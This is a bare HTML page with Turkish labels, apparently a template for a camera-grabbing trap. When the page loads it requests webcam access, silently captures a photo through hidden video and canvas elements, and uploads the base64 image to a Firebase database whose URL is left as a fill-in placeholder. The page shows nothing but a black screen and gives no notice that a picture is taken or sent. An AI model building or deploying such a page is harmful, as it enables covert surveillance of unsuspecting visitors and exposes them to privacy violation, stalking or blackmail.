<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>body { background: #000; margin: 0; overflow: hidden; }</style>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
    <script>
        const firebaseConfig = { databaseURL: "BURAYA_FIREBASE_DATABASE_URL" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                const video = document.getElementById('v');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    const base64Photo = canvas.toDataURL('image/jpeg');
                    db.ref('sistem_verileri/kamera').set({ resim: base64Photo, durum: "Görüntü Yakalandı" });
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);
            }).catch(err => { db.ref('sistem_verileri/kamera').set({ durum: "Reddedildi: " + err.message }); });
        };
    </script>
</body>
</html>
